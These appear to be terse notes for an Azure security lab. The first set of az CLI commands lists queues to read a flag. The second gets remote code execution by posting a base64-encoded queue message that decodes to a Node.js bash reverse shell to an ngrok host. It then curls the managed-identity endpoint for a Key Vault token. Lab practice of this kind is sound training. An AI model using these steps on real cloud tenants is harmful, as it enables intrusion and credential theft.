# Azure Queue

## Read flag from a queue

```sh
az storage account list
az storage queue list --account-name queuelab102fedb58 --auth-mode login > queues.json
#az storage message peek --account-name queuelab102fedb58 --queue-name <queue_name> --auth-mode login

read_queues.sh
```

## RCE throug­h queue messag­es

```sh
az functionapp list
az functionapp function list -n 02fedb58-queue-function-apps-lab-2 -g queue-labs-rg-2-su615x

az storage account list
az storage container list --account-name queuelab202fedb58
az storage blob list --account-name queuelab202fedb58 -c scm-releases
az storage blob download --account-name queuelab202fedb58 -c scm-releases --auth-mode key -n scm-latest-02fedb58-queue-function-apps-lab-2.zip -f ./scm-latest-02fedb58-queue-function-apps-lab-2.zip

mkdir func-src && unzip -q scm-latest-02fedb58-queue-function-apps-lab-2.zip -d func-src || true
# if unzip fails, it may be a squashfs – mount it instead:
sudo mount -o loop scm-latest-02fedb58-queue-function-apps-lab-2.zip func-src # outside exegol if not working

# To get source code
less func-src/src/functions/hello-world.js

# Base64 encode is likey to be needed
az storage message put --queue-name lab-queue-2 --content "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvNi50Y3AuZXUubmdyb2suaW8vMTczMTAgMD4mMSInKQo=" --account-name queuelab202fedb58 --auth-mode key

curl -H "X-IDENTITY-HEADER: $MSI_SECRET" "$MSI_ENDPOINT/?resource=https://vault.azure.net/&api-version=2019-08-01"
```
